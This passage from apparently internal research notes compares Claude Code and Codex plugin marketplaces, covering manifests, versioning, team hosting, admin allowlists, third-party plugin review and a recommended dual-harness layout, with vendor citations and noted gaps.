  - Without a constraint, a dependency moves with each release: "If that release renames an MCP tool your plugin calls, your plugin breaks". Use `~2.1.0` to receive patches only.
  - Ranges resolve against `<plugin>--v<version>` git tags; `claude plugin tag --push` creates them.
  - Cross-marketplace dependencies need `allowCrossMarketplaceDependenciesOn`.

  — [Plugin dependencies](https://code.claude.com/docs/en/plugins/dependencies)
- [Vendor] A meta-plugin can symlink skills from sibling plugins in the same marketplace; they are dereferenced into the cache. Symlinks that leave the marketplace are skipped. — [Host a marketplace](https://code.claude.com/docs/en/plugins/host-marketplace)

**One repo serving both Claude Code and Codex marketplaces**
- [Vendor] Codex reads `$REPO_ROOT/.agents/plugins/marketplace.json` (repo), `~/.agents/plugins/marketplace.json` (personal), and "Legacy-compatible: `$REPO_ROOT/.claude-plugin/marketplace.json`".
  - Required fields per entry: `name`, `source`, `policy.installation` (`AVAILABLE`/`INSTALLED_BY_DEFAULT`/`NOT_AVAILABLE`), `policy.authentication`, `category`.
  - Missing required fields cause entries to be skipped.
  - Local `source.path` must start with `./` and stay inside the marketplace root.

  — [Codex Build plugins](https://developers.openai.com/codex/plugins/build.md)
- [Vendor] Codex plugin hooks receive `PLUGIN_ROOT`/`PLUGIN_DATA` and also `CLAUDE_PLUGIN_ROOT`/`CLAUDE_PLUGIN_DATA` "legacy compatibility". Hook paths start with `./` and stay inside the plugin root. — [Codex Build plugins](https://developers.openai.com/codex/plugins/build.md)
- [Vendor] Claude Code requires `name`, `owner` and `plugins` in the marketplace file, and `name` and `source` per entry.
  - `claude plugin validate` warns on unknown fields but does not fail.
  - Keep the entry name equal to the manifest name.
  - No `..` in relative paths.

  — [Create a marketplace](https://code.claude.com/docs/en/plugin-marketplaces)

**Versioning and update strategy**
- [Vendor] Claude Code: "Bump `version` on each release: users stay on their cached copy until the string changes". Or omit `version` everywhere to track commits. Don't set it in both `plugin.json` and the marketplace entry, because `plugin.json` silently wins.
  - Pin with `ref`/`sha` on entries, or `#<ref>` on the add command.
  - Release channels mean two marketplaces with different `name`s pointing at different refs. "Claude Code has no release-channel concept."
  - Rename safely with the `renames` map and `displayName`, and treat `renames` as append-only.
  - `forceRemoveDeletedPlugins` uninstalls removed entries.

  — [Host and maintain a marketplace](https://code.claude.com/docs/en/plugins/host-marketplace)
- [Vendor] Claude Code auto-update is off for third-party marketplaces until a user or admin turns it on (`autoUpdate` in managed `extraKnownMarketplaces`). Background updates use stored git credentials and never prompt. — [Host a marketplace](https://code.claude.com/docs/en/plugins/host-marketplace); [Plugins for orgs](https://code.claude.com/docs/en/plugins/org)
- [Vendor] Codex: semver `version` in root `plugin.json` "enables marketplace updates". Updates come through `codex plugin marketplace upgrade`, and `marketplace add owner/repo --ref main` pins a ref. — [Codex Build plugins](https://developers.openai.com/codex/plugins/build.md)
- [Vendor] Archive sources should be pinned with `sha256`; Claude Code refuses a download whose digest differs. The community catalog pins plugins to commit SHAs. — [Host a marketplace](https://code.claude.com/docs/en/plugins/host-marketplace); [Plugin security](https://code.claude.com/docs/en/plugins/security)

**Team and internal marketplaces**
- [Vendor] Claude Code options:
  - Host on GitHub, another git host, a hosted `marketplace.json` URL, or a shared directory.
  - Private repos rely on the user's non-interactive git credentials (`gh auth setup-git`). `marketplace.json` has no token field.
  - For a repository-scoped team, `claude plugin marketplace add ... --scope project` and commit `.claude/settings.json`. This applies only after folder trust.
  - For containers and CI, seed a directory with `CLAUDE_CODE_PLUGIN_SEED_DIR`. It is read-only and auto-update is forced off.
  - `CLAUDE_CODE_SYNC_PLUGIN_INSTALL=1` makes a `-p` run wait for plugin installs.

  — [Host a marketplace](https://code.claude.com/docs/en/plugins/host-marketplace); [Plugins for orgs](https://code.claude.com/docs/en/plugins/org)
- [Vendor] Codex: `[plugins."my-plugin@local-repo"] enabled = true` in the repo's `.codex/config.toml`. Workspace publishing (admin) keeps plugins inside the org. `features.plugin_sharing = false` turns sharing off. — [Codex Build plugins](https://developers.openai.com/codex/plugins/build.md)

**Admin allowlists**
- [Vendor] Claude Code managed settings:
  - `strictKnownMarketplaces` allowlists sources. `[]` blocks all, including the official marketplace. Owner wildcard `your-org/*` and `hostPattern` are supported, and `ref`/`path` must match exactly.
  - `blockedMarketplaces` is checked first and canonicalizes URLs.
  - `enabledPlugins` true force-enables; false blocks and hides.
  - `disableSideloadFlags`, `allowManagedHooksOnly`, `disableCommandPluginSources` and `strictPluginOnlyCustomization` are further switches.
  - The lists apply before download and again at session start.
  - Recommended policy: allow the official marketplace plus your own, register both explicitly in `extraKnownMarketplaces`, and set `disableSideloadFlags`.

  — [Plugins for orgs](https://code.claude.com/docs/en/plugins/org)
- [Vendor] Codex `requirements.toml`:
  - `[marketplaces] restrict_to_allowed_sources = true` with `allowed_sources` rules (git URL plus ref, `host_pattern`, or local path). The OpenAI catalog must be listed explicitly.
  - Plugin MCP identity allowlist under `plugins.<p>.mcp_servers.<s>.identity`.
  - `allow_managed_hooks_only` skips plugin hooks.

  — [Codex managed configuration](https://developers.openai.com/codex/enterprise/managed-configuration)
- [Vendor] Claude Code audit: OTel events `claude_code.plugin_installed`/`plugin_loaded`. Third-party names are redacted unless `OTEL_LOG_TOOL_DETAILS=1`. Enterprise customers also have a plugins Analytics API. — [Plugins for orgs](https://code.claude.com/docs/en/plugins/org)

**Reviewing third-party plugins**
- [Vendor] "A Claude Code plugin you install can execute arbitrary code on your machine with your user privileges."
  - Hooks, MCP servers and mod processes run outside the sandbox.
  - `bin/` goes on the Bash tool's PATH.
  - Auto-update can change files you have already reviewed.
  - Review procedure: run `claude plugin marketplace list` to check the source, read the `/plugin` "Will install" pane, read `hooks/hooks.json`, `.mcp.json` and every file in `bin/`, and run `claude --plugin-dir <dir> plugin details <name>` for the component inventory.
  - A marketplace name signals who publishes the catalog, not what the plugins do. Official and community names are accepted only from `github.com/anthropics/`.

  — [Plugin security and trust](https://code.claude.com/docs/en/plugins/security)
- [Vendor] Codex: bundled hooks "are non-managed and require user trust review before execution" (`/hooks`). — [Codex Build plugins](https://developers.openai.com/codex/plugins/build.md)
- [Advisory] Repository config that enables plugins or marketplaces is executable configuration. Both Check Point disclosures (Claude Code project settings and Codex project config) show that project-level config ran code before consent in older versions. — [Check Point, Claude Code](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); [Check Point, Codex](https://research.checkpoint.com/2025/openai-codex-cli-command-injection-vulnerability/)

### Inferences
- **Recommended dual-harness layout** (from `docs/concepts/plugins.md`):
  - one `.claude-plugin/marketplace.json` containing the union of required fields: `owner`, and per entry `policy.installation`, `policy.authentication`, `category`;
  - per plugin, `.claude-plugin/plugin.json` and a root `plugin.json` with identical `name`, `version` and `description`;
  - shared `skills/` and `hooks/hooks.json` using `${CLAUDE_PLUGIN_ROOT}`;
  - MCP definitions in both `.mcp.json` (Claude Code) and `mcp.json` with a `type` per server (Codex portable format).

  Claude Code should only warn on Codex-only fields such as `policy`, because unknown fields are warnings, not errors. Verify with `claude plugin validate` and a real `codex plugin marketplace add`.
- **Plugin granularity:**
  - one plugin per capability or integration, which makes review, versioning and admin force-enable or block easier, since admin control works per plugin, not per skill;
  - role bundles built from Claude Code `dependencies`. Codex has no dependency mechanism, so a Codex suite means listing several entries or using `INSTALLED_BY_DEFAULT`.
- **Updates:**
  - explicit semver plus a version bump per release in both manifests, and git tags `<plugin>--v<version>`;
  - a CI job that runs `claude plugin validate .` and fails when the two manifests' versions differ;
  - stable and latest channel marketplaces for early adopters;
  - auto-update on only for internal marketplaces you control. For third-party plugins, pin `ref`/`sha` and re-review before updating.
- **Anti-patterns:**
  - Pushing commits without a version bump: Claude Code users never receive them.
  - Changing `name`: this breaks installs; use `displayName` or `renames`.
  - Secrets or git tokens in `marketplace.json`.
  - Relative-path entries in a URL-hosted catalog.
  - Plugin files in Git LFS.
  - A top-level `bin/` for org sync.
  - Unpinned `npx` MCP servers inside a plugin.
  - Turning on auto-update for third-party marketplaces.
- **How to verify:**
  - Claude Code: `claude plugin validate`, `claude plugin list`, `claude plugin details`, and `claude -p --output-format stream-json --verbose` (the `init` event lists the loaded plugins). For admin policy, check `/status` for "Enterprise managed settings" and try adding a blocked marketplace.
  - Codex: `codex plugin marketplace list`, `/plugins`, `/hooks` for trust, and a new session to confirm skills and tools load.

### Gaps
- Codex's docs do not say whether it reads `.claude-plugin/plugin.json` manifests. The Codex MCP page and the plugin layout also disagree on `.mcp.json` versus `mcp.json`, as `docs/concepts/plugins.md` already records. Untested.
- I found no Codex equivalent of plugin `dependencies`, `renames`, release-channel guidance, or a `validate` command.
- I found no published review checklist from OpenAI for third-party Codex plugins beyond hook trust review.
- I found no empirical data on plugin supply-chain incidents (as opposed to MCP package incidents) as of October 2026.

## Security follow-up, 2026-10-05

The [cross-concept research](../agent-harness-security.md) adds read-only
query disclosure, current protocol authorization/transport requirements,
SDK isolation advisories and proposed benign tests. Citations above now
pin revision 2026-07-28; older implementations may negotiate legacy
revisions. The Postmark incident now uses its first-party notice.
